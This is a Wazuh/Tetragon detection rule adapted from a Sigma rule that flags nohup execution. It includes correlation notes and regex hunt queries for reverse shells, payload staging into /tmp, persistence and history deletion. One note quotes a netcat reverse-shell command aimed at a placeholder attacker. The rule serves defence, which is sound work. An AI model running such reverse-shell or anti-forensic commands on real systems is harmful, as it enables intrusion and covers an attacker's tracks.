name: Nohup Execution
id: e4ffe466-6ff8-48d4-94bd-e32d1a6061e2
version: 1
schema_version: "1.0"
date: "2022-06-06"
author: Christopher Peacock @SecurePeacock, SCYTHE @scythe_io
source:
  format: sigma
  repository: SigmaHQ/sigma
  rule_id: e4ffe466-6ff8-48d4-94bd-e32d1a6061e2
  commit: release-20260810
  license: DRL-1.1
converted_by: Moussa Amine — sigma2copilot v0.1.0
status: experimental
type: TTP

description: >
  Detects usage of nohup which could be leveraged by an attacker to keep a
  process running or break out from restricted environments. MITRE ATT&CK:
  T1059.004.

data_source:
  - Tetragon process_exec via Wazuh agent

search:
  index_pattern: "${INDEX_PATTERN}"
  size: 100
  sort:
    - timestamp: desc
  query:
    bool:
      must:
        - term:
            agent_name: "${AGENT_NAME}"
        - term:
            agent_labels_customer: "${CUSTOMER_CODE}"
        
        - wildcard:
            data_process_exec_process_binary:
              value: "*/nohup"
              case_insensitive: true
        # ---- end generated ----
        - range:
            timestamp:
              gte: "${START_TIME}"
              lte: "${END_TIME}"
  _source:
    - timestamp
    - agent_name
    - data_process_exec_process_binary
    - data_process_exec_process_arguments
    - data_process_exec_parent_binary
    - data_process_exec_process_uid

parameters:
  AGENT_NAME:
    description: "Target agent/host name"
    type: string
    required: true
    example: "DESKTOP-AM0HLGE"
  CUSTOMER_CODE:
    description: "Customer label for filtering"
    type: string
    required: true
    example: "lab"
  INDEX_PATTERN:
    description: "Elasticsearch index pattern"
    type: string
    required: true
    example: "wazuh-lab_*"
  START_TIME:
    description: "Query start time (ISO 8601 or relative)"
    type: datetime
    required: false
    default: "now-24h"
    example: "2026-04-08 00:00:00.000"
  END_TIME:
    description: "Query end time (ISO 8601 or relative)"
    type: datetime
    required: false
    default: "now"
    example: "2026-04-08 23:59:59.999"

how_to_implement: >
  Requires Tetragon deployed on the Linux endpoint emitting process_exec events
  (rule_groups "tetragon, process_exec"), shipped by the Wazuh agent and
  ingested into the wazuh-* indices. Tetragon records the executable in
  data_process_exec_process_binary and its arguments separately in
  data_process_exec_process_arguments. The detection looks for events where
  data_process_exec_process_binary matches '*/nohup'.

known_false_positives: >
  Administrators or installed processes that leverage nohup. Baseline expected
  activity in your environment and tune this detection before relying on it for
  automated response.

references:
  - https://gtfobins.github.io/gtfobins/nohup/
  - https://en.wikipedia.org/wiki/Nohup
  - https://www.computerhope.com/unix/unohup.htm
  - https://attack.mitre.org/techniques/T1059/004/

response:
  message: >
    Nohup Execution detected on host $agent_name$. Matched
    data_process_exec_process_binary: $data_process_exec_process_binary$.
    Matched data_process_exec_process_arguments:
    $data_process_exec_process_arguments$. MITRE ATT&CK: T1059.004
  risk_score: 50
  severity: medium
  risk_objects:
    - field: agent_name
      type: system
      score: 50
  threat_objects:
    - field: data_process_exec_process_binary
      type: other
    - field: data_process_exec_process_arguments
      type: other

tags:
  asset_type: Endpoint
  mitre_attack_id:
    - T1059.004
  custom_tags:
    - nohup
    - linux
    - tetragon
    - process_creation
    - execution
  product:
    - Wazuh
  security_domain: endpoint

graylog:
  query: data_process_exec_process_binary:/.*\/[Nn][Oo][Hh][Uu][Pp]/

correlation:
  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
  related_rules:
  - id: 457df417-8b9d-4912-85f3-9dbda39c3645
    name: Suspicious Nohup Execution
    reason: 'Higher-fidelity sibling: the same nohup execution but with the backgrounded binary living under /tmp. If it fires on this host it confirms the thing nohup is keeping alive is a dropped payload (its references cite GobRAT), turning a tunable medium alert into a near-certain incident.'
  - id: cf610c15-ed71-46e1-bdf8-2bd1a99de6c4
    name: Download File To Potentially Suspicious Directory Via Wget
    reason: 'Staging precursor: the implant nohup makes durable is typically fetched to a world-writable dir (/tmp) via wget minutes before the launch. A wget-to-/tmp just before the nohup on the same host is the drop that preceded the persistent run.'
  - id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
    name: Suspicious Download and Execute Pattern via Curl/Wget
    reason: 'Fileless staging precursor: curl/wget pulls a stager into /tmp or /dev/shm and runs it via ''sh -c''; nohup is the next step attackers add so that stager keeps running after they disconnect. Same host, same short window.'
  - id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
    name: Potential Netcat Reverse Shell Execution
    reason: 'Co-occurring payload: ''nohup nc -e /bin/sh <attacker> <port> &'' is the canonical way to keep a netcat reverse shell alive past SSH/session teardown. nohup is the wrapper; this rule catches the reverse shell it wraps on the same host.'
  - id: 9069ea3c-b213-4c52-be13-86506a227ab1
    name: Linux Crypto Mining Indicators
    reason: 'Co-occurring payload (impact): cryptominers are routinely launched under nohup so they survive the operator logging out. A miner command line and a nohup on the same host inside the window is the mining job being made durable.'
  - id: 818f7b24-0fba-4c49-a073-8b755573b9c7
    name: Linux Webshell Indicators
    reason: 'Breakout-to-persistence: a web-server-parented process (httpd/nginx/apache2/node) is a webshell foothold bound to one HTTP request; operators use nohup to detach a shell or implant from that request so the backdoor outlives the web transaction.'
  - id: 6b14bac8-3e3a-4324-8109-42f0546a347f
    name: Scheduled Cron Task/Job - Linux
    reason: 'Parallel persistence: having made one process durable with nohup (survives logout, not reboot), attackers commonly add a crontab job staged from /tmp as a second, reboot-surviving layer on the same host.'
  - id: 1182f3b3-e716-4efa-99ab-d2685d04360f
    name: History File Deletion
    reason: 'Anti-forensic follow-on: after backgrounding a backdoor with nohup, operators frequently delete ~/.bash_history/.zsh_history to erase the nohup command line and the staging that preceded it. The clean-up step that reveals intent.'
  window: 2h
  enrichment_searches:
  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
  - name: 'Backgrounded payload: reverse shell, /dev/tcp, or crypto-miner activity on this host'
    query: ((data_process_exec_process_binary:/.*(\/[Nn][Cc]|\/[Nn][Cc][Aa][Tt])/ AND data_process_exec_process_arguments:/.* -[CcEe] .*/) OR (data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Tt][Cc][Pp]\/.*/) OR (data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Uu][Dd][Pp]\/.*/) OR (data_process_exec_process_arguments:/.*[Pp][Tt][Yy].*[Ss][Pp][Aa][Ww][Nn].*/) OR (data_process_exec_process_arguments:/.*[Ss][Tt][Rr][Aa][Tt][Uu][Mm]\+[Tt][Cc][Pp].*/) OR (data_process_exec_process_arguments:/.* -[Oo] [Pp][Oo][Oo][Ll]\..*/) OR (data_process_exec_process_arguments:/.*--[Dd][Oo][Nn][Aa][Tt][Ee]-[Ll][Ee][Vv][Ee][Ll].*/))
    pivot_on:
    - host
    window: 2h
  - name: 'Payload staging: wget/curl/tftp fetching content into /tmp, /dev/shm or /var/tmp on this host'
    query: ((data_process_exec_process_binary:/.*(\/[Ww][Gg][Ee][Tt]|\/[Cc][Uu][Rr][Ll]|\/[Tt][Ff][Tt][Pp])/) AND (data_process_exec_process_arguments:/.*\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/))
    pivot_on:
    - host
    window: 4h
  - name: 'Dropped file made runnable: chmod on a tmp/shm path or setting an executable/setuid bit on this host'
    query: (data_process_exec_process_binary:/.*\/[Cc][Hh][Mm][Oo][Dd]/ AND (data_process_exec_process_arguments:/.*\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\+[Xx].*/ OR data_process_exec_process_arguments:/.*[Uu]\+[Ss].*/))
    pivot_on:
    - host
    window: 4h
  - name: 'Additional persistence layered on this host: cron, systemd, rc.local, shell profiles or authorized_keys'
    query: ((data_process_exec_process_binary:/.*(\/[Cc][Rr][Oo][Nn][Tt][Aa][Bb]|\/[Ss][Yy][Ss][Tt][Ee][Mm][Cc][Tt][Ll]|\/[Uu][Pp][Dd][Aa][Tt][Ee]-[Rr][Cc]\.[Dd])/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Cc][Rr][Oo][Nn].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ss][Yy][Ss][Tt][Ee][Mm][Dd].*/) OR (data_process_exec_process_arguments:/.*[Rr][Cc]\.[Ll][Oo][Cc][Aa][Ll].*/) OR (data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh][Rr][Cc].*/) OR (data_process_exec_process_arguments:/.*[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Ee][Dd]_[Kk][Ee][Yy][Ss].*/))
    pivot_on:
    - host
    window: 6h
  - name: 'Anti-forensics on this host: deletion/truncation of shell history or /var/log'
    query: ((data_process_exec_process_binary:/.*(\/[Rr][Mm]|\/[Ss][Hh][Rr][Ee][Dd]|\/[Uu][Nn][Ll][Ii][Nn][Kk]|\/[Tt][Rr][Uu][Nn][Cc][Aa][Tt][Ee])/) AND (data_process_exec_process_arguments:/.*[Hh][Ii][Ss][Tt][Oo][Rr][Yy].*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Ll][Oo][Gg]\/.*/))
    pivot_on:
    - host
    window: 6h
